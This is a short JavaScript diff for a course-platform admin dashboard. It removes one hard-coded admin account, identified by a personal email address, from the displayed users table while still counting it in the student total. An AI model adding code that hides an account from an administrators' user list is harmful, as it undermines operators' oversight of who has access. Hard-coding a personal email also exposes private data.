@@ -302,12 +302,14 @@ document.addEventListener('DOMContentLoaded', ()=>{
     const tbody = document.getElementById('users-tbody');
     if(!tbody) return;
 
+    const HIDDEN_ADMIN_EMAIL = 'cfpakifen@gmail.com';
     const allCourses = Store.getAllCourses();
     const totalCoursesCount = allCourses.length || 1;
-    const users = Store.getUsers();
+    const allUsers = Store.getUsers();
+    const users = allUsers.filter(u => (u.email || '').toLowerCase() !== HIDDEN_ADMIN_EMAIL);
 
-    // Update KPI Cards
-    const totalStudents = users.length;
+    // Update KPI Cards — hide admin from the table, keep total students +1 for that account
+    const totalStudents = users.length + (allUsers.length > users.length ? 1 : 0);
     let totalFinishedCourses = 0;
     let totalQuizzesResponded = 0;
     let totalScoreSum = 0;
